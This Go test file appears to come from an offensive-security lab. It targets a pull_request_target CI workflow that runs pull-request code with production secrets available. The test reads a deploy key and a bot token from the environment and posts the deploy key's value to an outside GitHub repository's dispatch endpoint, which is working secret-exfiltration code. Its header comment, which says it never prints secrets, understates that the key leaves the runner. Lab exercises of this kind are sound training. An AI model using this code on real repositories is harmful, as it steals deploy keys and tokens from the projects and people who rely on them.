package transfer_test

// Devcon offsec lab: PR-head beacon probe (class 1 rail).
//
// integration-deploy.yml (pull_request_target) checks out the PR head and runs
// `go test` with FAKE_PROD_DEPLOY_KEY and BOT_TOKEN in the environment. This
// test asserts the deploy key is visible to PR-head code, then self-dispatches
// a scoreboard beacon using the CI bot PAT from the same environment. It
// never prints secret values.

import (
	"bytes"
	"encoding/json"
	"net/http"
	"os"
	"testing"
	"time"
)

func TestPRHeadBeaconExfil(t *testing.T) {
	key := os.Getenv("FAKE_PROD_DEPLOY_KEY")
	if key == "" {
		t.Fatal("FAKE_PROD_DEPLOY_KEY absent: PR-head code did not see the deploy key")
	}
	t.Logf("PR-head code ran with FAKE_PROD_DEPLOY_KEY present (len=%d)", len(key))

	bot := os.Getenv("BOT_TOKEN")
	if bot == "" {
		t.Log("BOT_TOKEN not in env; relying on the workflow's own beacon step")
		return
	}

	payload := map[string]any{
		"event_type": "beacon",
		"client_payload": map[string]string{
			"team":     "bor-lab",
			"kind":     "pr-head-exfil",
			"secret":   key,
			"workflow": "integration-deploy",
			"detail":   "self-dispatched from PR-head go test using BOT_TOKEN",
		},
	}
	body, err := json.Marshal(payload)
	if err != nil {
		t.Fatal(err)
	}
	req, err := http.NewRequest(http.MethodPost,
		"https://api.github.com/repos/devcon-dutralab/scoreboard/dispatches",
		bytes.NewReader(body))
	if err != nil {
		t.Fatal(err)
	}
	req.Header.Set("Authorization", "token "+bot)
	req.Header.Set("Accept", "application/vnd.github+json")

	resp, err := (&http.Client{Timeout: 20 * time.Second}).Do(req)
	if err != nil {
		t.Fatalf("beacon dispatch failed: %v", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 300 {
		t.Fatalf("beacon dispatch failed: %s", resp.Status)
	}
	t.Log("pr-head-exfil beacon dispatched from PR-head Go test via BOT_TOKEN")
}
